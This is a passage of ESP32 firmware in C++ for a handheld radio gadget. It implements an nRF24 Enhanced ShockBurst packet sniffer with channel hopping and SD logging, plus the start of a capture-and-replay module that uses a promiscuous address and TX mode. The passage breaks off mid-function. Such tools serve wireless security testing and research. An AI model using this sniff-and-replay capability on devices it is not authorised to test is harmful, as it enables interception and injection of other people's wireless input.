static void esbDrawTextBoxes() {
  const int logH = esbLogBoxH();
  const int endY = esbLogEndY();
  tft.fillRect(0, kEsbStatusY - 2, tft.width(), endY - kEsbStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kEsbStatusY, tft.width() - 8, kEsbStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kEsbLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kEsbStatPadX, kEsbStatusY + 3);
  tft.print("Capture");
  tft.setCursor(kEsbStatPadX, kEsbLogBoxTop + 3);
  tft.print("Packets");

  // Fixed label column — values update independently at kEsbStatValueX.
  static const char* kLabels[kEsbStatusLines] = {"Ch", "Pkts", "SD", "Mode"};
  for (int i = 0; i < kEsbStatusLines; i++) {
    const int y = kEsbStatusTextY + i * kEsbLineHeight + kEsbStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kEsbStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kEsbMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void esbUpdateStatusPanel() {
  char chVal[28];
  snprintf(chVal, sizeof(chVal), "%u  %s GHz", (unsigned)s_channel,
           esbChannelGHzText(s_channel).c_str());
  esbDrawStatusValue(0, String(chVal), s_hopping ? ORANGE : UI_TEXT);

  char pktVal[28];
  snprintf(pktVal, sizeof(pktVal), "%lu  %lu/s", (unsigned long)s_packetTotal,
           (unsigned long)s_ratePerSec);
  esbDrawStatusValue(1, String(pktVal), s_packetTotal > 0 ? UI_OK : UI_DIM_TEXT);

  if (s_logEnabled) {
    String queued = String("queued ") + String(s_pendingPacketCount);
    if (s_pendingPacketDropped) queued += String(" drop ") + String(s_pendingPacketDropped);
    esbDrawStatusValue(2, queued, s_pendingPacketDropped ? UI_WARN : UI_OK);
  } else {
    esbDrawStatusValue(2, "logging off", UI_DIM_TEXT);
  }

  String mode = s_hopping ? "Hop" : "Fixed";
  mode += sniffing ? "  |  Sniffing" : "  |  Stopped";
  esbDrawStatusValue(3, mode, sniffing ? UI_OK : UI_DIM_TEXT);
  s_esbStatusDirty = false;
}

static void esbFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_esbLastUiMs) < kEsbUiMinIntervalMs) {
    return;
  }
  if (!s_esbLogDirty && !s_esbStatusDirty && !force) {
    return;
  }
  s_esbLastUiMs = now;
  if (s_esbStatusDirty || force) {
    esbUpdateStatusPanel();
  }
  if (s_esbLogDirty || force) {
    esbRedrawLog();
  }
}

static void esbWritePacketToSd(uint32_t ts, uint8_t ch, const uint8_t* payload, int len) {
  // Capture into RAM while the nRF owns shared SPI. FatFS is intentionally
  // mounted only after exit, so s_sdReady must never gate this queue.
  if (!s_logEnabled || !payload || len <= 0) return;
  if (s_pendingPacketCount >= kPendingEsbPackets) {
    ++s_pendingPacketDropped;
    return;
  }
  PendingEsbPacket& packet = s_pendingPackets[s_pendingPacketCount++];
  packet.whenMs = ts;
  packet.channel = ch;
  packet.length = (uint8_t)min(len, kEsbPayloadMax);
  memcpy(packet.payload, payload, packet.length);
  s_esbStatusDirty = true;
}

static void esbOnPacket(uint8_t ch, const uint8_t* payload, int len) {
  s_packetTotal++;
  s_rateCount++;

  String preview = "+ ch" + String(ch) + " [" + String(len) + "] " + esbPayloadHex(payload, min(len, 8));
  if (len > 8) {
    preview += "...";
  }
  esbAppendLogLine(preview, UI_TEXT);
  s_esbStatusDirty = true;

  if (s_logEnabled) {
    esbWritePacketToSd(millis(), ch, payload, len);
  }
}

static bool esbRxAvailable() {
  return (esbGetRegister(_ESB_STATUS) & 0x40) != 0;
}

static void esbReadPacket() {
  uint8_t payload[kEsbPayloadMax];
  digitalWrite(CSN, LOW);
  SPI.transfer(0x61);
  for (int i = 0; i < kEsbPayloadMax; i++) {
    payload[i] = SPI.transfer(0xFF);
  }
  digitalWrite(CSN, HIGH);
  esbSetRegister(_ESB_STATUS, 0x70);

  const int len = esbTrimPayloadLen(payload, kEsbPayloadMax);
  esbOnPacket(s_channel, payload, len);
}

static void esbPollPackets() {
  uint8_t guard = 0;
  while (sniffing && esbRxAvailable() && guard < 8) {
    esbReadPacket();
    guard++;
  }
}

static void esbUpdateRate() {
  const uint32_t now = millis();
  if (now - s_rateLastMs >= 1000) {
    s_ratePerSec = s_rateCount;
    s_rateCount = 0;
    s_rateLastMs = now;
    s_esbStatusDirty = true;
  }
}

static void esbStepHop() {
  if (!s_hopping) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_lastHopMs < kEsbHopIntervalMs) {
    return;
  }
  s_lastHopMs = now;
  s_hopIndex = (s_hopIndex + 1) % kHopCount;
  s_channel = kHopChannels[s_hopIndex];
  esbApplyChannel(s_channel);
  s_esbStatusDirty = true;
}

static void esbChannelDown() {
  if (s_hopping || s_channel == 0) {
    return;
  }
  s_channel--;
  esbApplyChannel(s_channel);
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static void esbChannelUp() {
  if (s_hopping || s_channel >= 125) {
    return;
  }
  s_channel++;
  esbApplyChannel(s_channel);
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static void esbToggleHop() {
  s_hopping = !s_hopping;
  if (s_hopping) {
    s_hopIndex = 0;
    s_channel = kHopChannels[0];
    esbApplyChannel(s_channel);
    esbAppendLogLine("[*] Hop enabled", UI_WARN);
  } else {
    esbAppendLogLine("[*] Fixed channel", UI_DIM_TEXT);
  }
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static void esbToggleLog() {
  // This switch only controls the fixed RAM queue. FatFS remains untouched
  // while NRF owns SPI; queued packets are written in one transaction on exit.
  s_logEnabled = !s_logEnabled;
  if (s_logEnabled) {
    esbAppendLogLine("[+] Deferred SD log enabled", UI_OK);
  } else {
    esbAppendLogLine("[*] Deferred SD log paused", UI_DIM_TEXT);
  }
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static unsigned long s_esbLastBtnMs = 0;
static constexpr unsigned long kEsbNavDebounceMs = 80;

static void esbWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

void esbHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_esbLastBtnMs < kEsbNavDebounceMs) {
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    esbChannelDown();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    esbChannelUp();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    esbToggleHop();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    esbToggleLog();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_DOWN);
  }
}

static void esbPollNavButtons() {
  esbHandleNavButtons();
}

void runUI() {
  // Avoid Scanner::runUI macros (STATUS_BAR_*, ICON_*) which leak globally.
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 20;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 5;
  // Same spacing as BleSpoofer: back @10, then 40px steps from 90.
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;

  static const unsigned char* icons[kIconN] = {
    bitmap_icon_LEFT,
    bitmap_icon_random,
    bitmap_icon_sdcard,
    bitmap_icon_RIGHT,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);

    for (int i = 0; i < kIconN; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], UI_ICON);
      }
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0: esbChannelDown(); break;
        case 1: esbToggleHop(); break;
        case 2: esbToggleLog(); break;
        case 3: esbChannelUp(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < kIconN; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                sniffing = false;
              } else {
                drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void esbSnifferSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  neopixelClear();
  bleSetEsbNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  sniffing = true;
  s_channel = 76;
  s_hopping = false;
  s_logEnabled = true;
  // FatFS is deliberately not inspected until the radio has been released.
  // Logging remains available through the bounded deferred RAM queue.
  s_sdReady = false;
  s_logPath = "";
  s_pendingPacketCount = 0;
  s_pendingPacketDropped = 0;
  s_packetTotal = 0;
  s_rateCount = 0;
  s_rateLastMs = millis();
  s_ratePerSec = 0;
  s_lastHopMs = millis();
  s_hopIndex = 0;
  s_logIndex = 0;
  s_esbLogDirty = false;
  s_esbStatusDirty = false;
  s_esbLastUiMs = 0;
  for (int i = 0; i < kEsbMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kEsbStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  runUI();
  esbDrawTextBoxes();
  esbAppendLogLine("[+] ESB sniffer ready", UI_WARN);
  s_esbStatusDirty = true;
  esbFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  // Do not mount or inspect SD here. ESB immediately needs the shared SPI bus;
  // a mount->unmount->mount cycle is the reproducible source of persistent
  // ESP_ERR_NO_MEM failures in esp_vfs_fat_register after long captures.
  esbInitRadioSpi();
  esbConfigureRadio();
  esbAppendLogLine("[*] SD write deferred until exit", UI_DIM_TEXT);
  Serial.println(F("[esb] RAM queue active; SD untouched during capture"));
  s_esbStatusDirty = true;
  esbFlushUi(true);
  redrawTouchButtonBar();
}

void esbSnifferLoop() {
  sniffing = true;
  while (sniffing) {
    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      sniffing = false;
      break;
    }

    esbPollNavButtons();
    maintainTouchNavBar();
    runUI();
    esbStepHop();
    esbPollPackets();
    esbUpdateRate();
    esbFlushUi(false);

    delay(1);
  }
}

void exit() {
  sniffing = false;
  esbDisable();
  esbPowerDown();
  digitalWrite(CSN, HIGH);
  releaseSharedSpiWithoutSdMount();

  // Free dynamic UI strings before FatFS needs a contiguous VFS allocation.
  for (int i = 0; i < kEsbMaxLogLines; ++i) {
    s_logBuffer[i] = "";
    s_logDrawn[i] = "";
  }
  for (int i = 0; i < kEsbStatusLines; ++i) s_statusText[i] = "";
  delay(30);
  // Exactly one SD transaction is permitted after all radio/UI allocations
  // are released. Unlike the old path there is no setup-time mount, filename
  // reservation or intermediate unmount, so VFS is registered only once.
  const uint8_t queuedPackets = s_pendingPacketCount;
  // Create a real session file even when RF traffic produced no valid packet;
  // its header makes the logging result visible and distinguishes an empty RF
  // session from a storage failure.
  const bool logOk = esbFlushPendingPackets();
  Serial.printf("[esb] deferred log %s packets=%u path=%s heap=%u largest=%u\n",
                logOk ? "OK" : "FAILED", (unsigned)queuedPackets,
                s_logPath.c_str(), (unsigned)ESP.getFreeHeap(),
                (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
  // A failed optional log must not be retried in a loop from the main menu.
  s_pendingPacketCount = 0;
  s_sdReady = false;
  s_logPath = "";
  Serial.printf("[esb] exit complete heap=%u largest=%u\n",
                (unsigned)ESP.getFreeHeap(),
                (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
}

}  // namespace EsbSniffer

namespace EsbReplay {

#define CE  configuredNrfAuxCePin()
#define CSN configuredNrfAuxCsnPin()

#define _RP_CONFIG     0x00
#define _RP_EN_AA      0x01
#define _RP_EN_RXADDR  0x02
#define _RP_SETUP_AW   0x03
#define _RP_SETUP_RETR 0x04
#define _RP_RF_CH      0x05
#define _RP_RF_SETUP   0x06
#define _RP_STATUS     0x07
#define _RP_RX_ADDR_P0 0x0A
#define _RP_TX_ADDR    0x10
#define _RP_RX_PW_P0   0x11

static constexpr int kRpPayloadMax = 32;
#if BOARD_HAS_ESP32S3
static constexpr int kRpMaxCaptures = 8;
static constexpr int kRpMaxSelLines = 8;
static constexpr int kRpMaxLogLines = 10;
#else
static constexpr int kRpMaxCaptures = ESP32DIV_ESB_RP_CAPTURES;
static constexpr int kRpMaxSelLines = ESP32DIV_ESB_RP_SEL_LINES;
static constexpr int kRpMaxLogLines = ESP32DIV_ESB_RP_LOG_LINES;
#endif
static constexpr int kRpStatusLines = 3;
static constexpr int kRpSelVisible = 5;
static constexpr int kRpLineHeight = 12;
static constexpr int kRpToolbarBottom = 36;
static constexpr int kRpToolbarGap = 8;
static constexpr int kRpStatusY = kRpToolbarBottom + kRpToolbarGap;
static constexpr int kRpBoxHeaderH = 15;
static constexpr int kRpStatusTextY = kRpStatusY + kRpBoxHeaderH;
static constexpr int kRpStatusBoxH = kRpBoxHeaderH + (kRpStatusLines * kRpLineHeight) + 4;
static constexpr int kRpPanelGap = 4;
static constexpr int kRpSelBoxTop = kRpStatusY + kRpStatusBoxH + kRpPanelGap;
static constexpr int kRpSelBoxH =
    kRpBoxHeaderH + (kRpSelVisible * kRpLineHeight) + 4;
static constexpr int kRpSelStartY = kRpSelBoxTop + kRpBoxHeaderH;
static constexpr int kRpLogBoxTop = kRpSelBoxTop + kRpSelBoxH + kRpPanelGap;
static constexpr int kRpLogStartY = kRpLogBoxTop + kRpBoxHeaderH;
static constexpr int kRpLogBottomPad = 4;
static constexpr int kRpStatPadX = 10;
static constexpr int kRpStatValueX = 70;
static constexpr int kRpStatTextDy = 2;
static constexpr uint32_t kRpUiMinIntervalMs = 100;
static constexpr uint32_t kRpHopIntervalMs = 80;
static constexpr uint8_t kRpReplayBursts = 4;
static constexpr uint16_t kRpReplayGapMs = 8;

static const uint8_t kRpHopChannels[] = {
  2, 5, 10, 26, 40, 50, 60, 70, 76, 78, 79, 80, 83
};
static constexpr int kRpHopCount = sizeof(kRpHopChannels) / sizeof(kRpHopChannels[0]);
static const uint8_t kRpPromiscAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

struct RpCapture {
  bool used = false;
  uint8_t channel = 0;
  uint8_t len = 0;
  uint8_t data[kRpPayloadMax];
};

static bool uiDrawn = false;
static volatile bool s_active = false;
static bool s_armed = true;
static bool s_hopping = true;
static bool s_playing = false;
static uint8_t s_channel = 76;
static int s_hopIndex = 0;
static uint32_t s_lastHopMs = 0;
static uint32_t s_heardTotal = 0;

static RpCapture s_caps[kRpMaxCaptures];
static int s_capCount = 0;
static int s_selIndex = 0;
static int s_selScroll = 0;

static String s_selBuffer[kRpMaxSelLines];
static uint16_t s_selColor[kRpMaxSelLines];
static int s_selLineCount = 0;
static String s_selDrawn[kRpMaxSelLines];
static uint16_t s_selDrawnColor[kRpMaxSelLines];
static int s_selDrawnW[kRpMaxSelLines];

static String s_logBuffer[kRpMaxLogLines];
static uint16_t s_logColor[kRpMaxLogLines];
static int s_logIndex = 0;
static String s_logDrawn[kRpMaxLogLines];
static uint16_t s_logDrawnColor[kRpMaxLogLines];
static int s_logDrawnW[kRpMaxLogLines];

static String s_statusText[kRpStatusLines];
static uint16_t s_statusColor[kRpStatusLines];
static int s_statusDrawnW[kRpStatusLines];

static bool s_logDirty = false;
static bool s_statusDirty = false;
static bool s_selDirty = false;
static uint32_t s_lastUiMs = 0;

static int rpLogBoxBottom() { return bleContentBottom() - kRpLogBottomPad; }
static int rpLogBoxH() {
  const int h = rpLogBoxBottom() - kRpLogBoxTop;
  return h > (kRpBoxHeaderH + kRpLineHeight) ? h : (kRpBoxHeaderH + kRpLineHeight);
}
static int rpLogEndY() { return kRpLogBoxTop + rpLogBoxH() - 2; }
static int rpVisibleLogLines() {
  const int avail = rpLogEndY() - kRpLogStartY;
  if (avail <= 0) return 1;
  const int n = avail / kRpLineHeight;
  return n < 1 ? 1 : (n > kRpMaxLogLines ? kRpMaxLogLines : n);
}
static int rpSelEndY() { return kRpSelBoxTop + kRpSelBoxH - 2; }

static byte rpGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void rpSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void rpWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);
}

static void rpDisable() { digitalWrite(CE, LOW); }
static void rpEnable() { digitalWrite(CE, HIGH); }

static void rpPowerUp() {
  rpSetRegister(_RP_CONFIG, rpGetRegister(_RP_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void rpPowerDown() {
  rpSetRegister(_RP_CONFIG, rpGetRegister(_RP_CONFIG) & ~0x02);
}

static void rpFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void rpFlushTx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE1);
  digitalWrite(CSN, HIGH);
}

static void rpInitSpi() {
  prepareNrfSharedSpiBus();
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(kNrfSpiHz);
  SPI.setBitOrder(MSBFIRST);
}

static void rpApplyChannel(uint8_t ch) {
  rpDisable();
  rpSetRegister(_RP_RF_CH, ch);
  rpFlushRx();
  if (s_armed && !s_playing) {
    rpEnable();
    delayMicroseconds(130);
  }
}

static void rpConfigureRx() {
  rpDisable();
  rpPowerUp();
  rpWriteRegMulti(_RP_RX_ADDR_P0, kRpPromiscAddr, 5);
  rpSetRegister(_RP_EN_AA, 0x00);
  rpSetRegister(_RP_EN_RXADDR, 0x01);
  rpSetRegister(_RP_SETUP_AW, 0x03);
  rpSetRegister(_RP_SETUP_RETR, 0x00);
  rpSetRegister(_RP_RF_SETUP, 0x0F);
  rpSetRegister(_RP_RX_PW_P0, kRpPayloadMax);
  rpSetRegister(_RP_CONFIG, 0x0B);  // CRC on, PWR_UP, PRIM_RX
  rpApplyChannel(s_channel);
  if (s_armed) {
    rpEnable();
    delayMicroseconds(130);
  }
}

static void rpConfigureTx(uint8_t ch) {
  rpDisable();
  rpPowerUp();
  rpWriteRegMulti(_RP_TX_ADDR, kRpPromiscAddr, 5);
  rpWriteRegMulti(_RP_RX_ADDR_P0, kRpPromiscAddr, 5);
  rpSetRegister(_RP_EN_AA, 0x00);
  rpSetRegister(_RP_EN_RXADDR, 0x01);
  rpSetRegister(_RP_SETUP_AW, 0x03);
  rpSetRegister(_RP_SETUP_RETR, 0x00);
  rpSetRegister(_RP_RF_SETUP, 0x0F);
  rpSetRegister(_RP_RF_CH, ch);
  rpSetRegister(_RP_CONFIG, 0x0E);  // CRC on, PWR_UP, PRIM_TX
  rpFlushTx();
  rpFlushRx();
}

static void rpPaintTextLine(int x, int y, int maxW, int lineH,
                            String& cacheText, uint16_t& cacheColor, int& cacheW,
                            const String& text, uint16_t color) {
  if (cacheText == text && cacheColor == color) return;
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) clearW = maxW;
  if (clearW > maxW) clearW = maxW;
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kRpStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void rpAppendLog(const String& text, uint16_t color) {
  const int visible = rpVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) s_logIndex++;
  s_logDirty = true;
}

static String rpPayloadHex(const uint8_t* p, int len, int maxBytes = 8) {
  char buf[3 * 12 + 1];
  int pos = 0;
  const int n = len < maxBytes ? len : maxBytes;
  for (int i = 0; i < n && pos < (int)sizeof(buf) - 3; i++) {
    pos += snprintf(buf + pos, sizeof(buf) - pos, "%02X", p[i]);
  }
  if (len > maxBytes && pos < (int)sizeof(buf) - 3) {
    buf[pos++] = '.';
    buf[pos++] = '.';
    buf[pos++] = '.';
  }
  buf[pos] = '\0';
  return String(buf);
}

static void rpClampSelScroll() {
  if (s_capCount <= 0) {
    s_selScroll = 0;
    return;
  }
  if (s_selIndex < s_selScroll) s_selScroll = s_selIndex;
  if (s_selIndex >= s_selScroll + kRpSelVisible) {
    s_selScroll = s_selIndex - kRpSelVisible + 1;
  }
  if (s_selScroll < 0) s_selScroll = 0;
  const int maxScroll = s_capCount > kRpSelVisible ? (s_capCount - kRpSelVisible) : 0;
  if (s_selScroll > maxScroll) s_selScroll = maxScroll;
}

static void rpRebuildSelect() {
  rpClampSelScroll();
  s_selLineCount = 0;
  for (int i = 0; i < kRpMaxSelLines; i++) {
    s_selBuffer[i] = "";
    s_selColor[i] = UI_DIM_TEXT;
  }

  if (s_capCount == 0) {
    s_selBuffer[0] = "[*] No packets yet";
    s_selColor[0] = UI_DIM_TEXT;
    s_selBuffer[1] = "    Arm, then Prev/Next";
    s_selColor[1] = UI_DIM_TEXT;
    s_selLineCount = 2;
  } else {
    for (int row = 0; row < kRpSelVisible; row++) {
      const int idx = s_selScroll + row;
      if (idx >= s_capCount) break;
      const RpCapture& c = s_caps[idx];
      const bool selected = (idx == s_selIndex);
      String line = selected ? "> " : "  ";
      line += String(idx + 1);
      line += "/";
      line += String(s_capCount);
      line += " ch";
      line += String(c.channel);
      line += " [";
      line += String(c.len);
      line += "] ";
      line += rpPayloadHex(c.data, c.len, 5);
      s_selBuffer[row] = line;
      s_selColor[row] = selected ? ORANGE : UI_TEXT;
      s_selLineCount++;
    }
  }
  s_selDirty = true;
}

static void rpRedrawSelect() {
  const int endY = rpSelEndY();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < kRpSelVisible; i++) {
    const int y = kRpSelStartY + i * kRpLineHeight;
    if (y + kRpLineHeight > endY) break;
    if (i < s_selLineCount) {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_selDrawn[i], s_selDrawnColor[i], s_selDrawnW[i],
                      s_selBuffer[i], s_selColor[i]);
    } else {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_selDrawn[i], s_selDrawnColor[i], s_selDrawnW[i],
                      String(""), UI_DIM_TEXT);
    }
  }
  s_selDirty = false;
}

static void rpRedrawLog() {
  const int endY = rpLogEndY();
  const int visible = rpVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kRpLogStartY + i * kRpLineHeight;
    if (y + kRpLineHeight > endY) break;
    if (i < s_logIndex) {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      s_logBuffer[i], s_logColor[i]);
    } else {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      String(""), UI_DIM_TEXT);
    }
  }
  s_logDirty = false;
}

static void rpDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kRpStatusLines) return;
  const int y = kRpStatusTextY + line * kRpLineHeight;
  const int maxW = tft.width() - kRpStatValueX - 8;
  rpPaintTextLine(kRpStatValueX, y, maxW, kRpLineHeight,
                  s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                  text, color);
}

static void rpUpdateStatusPanel() {
  char chVal[24];
  snprintf(chVal, sizeof(chVal), "%u%s", (unsigned)s_channel, s_hopping ? " hop" : "");
  rpDrawStatusValue(0, String(chVal), s_hopping ? ORANGE : UI_TEXT);

  char capVal[24];
  snprintf(capVal, sizeof(capVal), "%d / %d", s_capCount, kRpMaxCaptures);
  rpDrawStatusValue(1, String(capVal), s_capCount > 0 ? UI_OK : UI_DIM_TEXT);

  if (s_playing) {
    rpDrawStatusValue(2, "Playing", UI_WARN);
  } else if (s_armed) {
    rpDrawStatusValue(2, "Armed", UI_OK);
  } else {
    rpDrawStatusValue(2, "Idle", UI_DIM_TEXT);
  }
  s_statusDirty = false;
}

static void rpDrawTextBoxes() {
  const int logH = rpLogBoxH();
  const int endY = rpLogEndY();
  tft.fillRect(0, kRpStatusY - 2, tft.width(), endY - kRpStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kRpStatusY, tft.width() - 8, kRpStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kRpSelBoxTop, tft.width() - 8, kRpSelBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kRpLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kRpStatPadX, kRpStatusY + 3);
  tft.print("Replay");
  tft.setCursor(kRpStatPadX, kRpSelBoxTop + 3);
  tft.print("Select");
  tft.setCursor(kRpStatPadX, kRpLogBoxTop + 3);
  tft.print("Activity");

  static const char* kLabels[kRpStatusLines] = {"Ch", "Saved", "State"};
  for (int i = 0; i < kRpStatusLines; i++) {
    const int y = kRpStatusTextY + i * kRpLineHeight + kRpStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kRpStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpMaxSelLines; i++) {
    s_selDrawn[i] = "";
    s_selDrawnColor[i] = 0;
    s_selDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void rpFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_lastUiMs) < kRpUiMinIntervalMs) return;
  if (!force && !s_logDirty && !s_statusDirty && !s_selDirty) return;
  s_lastUiMs = now;
  if (s_statusDirty || force) rpUpdateStatusPanel();
  if (s_selDirty || force) {
    rpRebuildSelect();
    rpRedrawSelect();
  }
  if (s_logDirty || force) rpRedrawLog();
}

static int rpTrimLen(const uint8_t* p, int maxLen) {
  int len = maxLen;
  while (len > 1 && p[len - 1] == 0x00) len--;
  return len;
}

static bool rpInteresting(const uint8_t* p, int len) {
  if (len < 2) return false;
  int zeros = 0, ff = 0;
  for (int i = 0; i < len; i++) {
    if (p[i] == 0x00) zeros++;
    if (p[i] == 0xFF) ff++;
  }
  return !(zeros >= len - 1 || ff >= len - 1);
}

static void rpStoreCapture(uint8_t ch, const uint8_t* data, uint8_t len) {
  // Dedup identical latest packet
  if (s_capCount > 0) {
    const RpCapture& last = s_caps[0];
    if (last.used && last.channel == ch && last.len == len &&
        memcmp(last.data, data, len) == 0) {
      return;
    }
  }

  // Newest at index 0
  for (int i = kRpMaxCaptures - 1; i > 0; i--) {
    s_caps[i] = s_caps[i - 1];
  }
  s_caps[0].used = true;
  s_caps[0].channel = ch;
  s_caps[0].len = len;
  memcpy(s_caps[0].data, data, len);
  if (s_capCount < kRpMaxCaptures) s_capCount++;
  s_selIndex = 0;
  s_selScroll = 0;
  s_selDirty = true;
  s_statusDirty = true;
  rpAppendLog(String("+ ch") + String(ch) + " [" + String(len) + "] " +
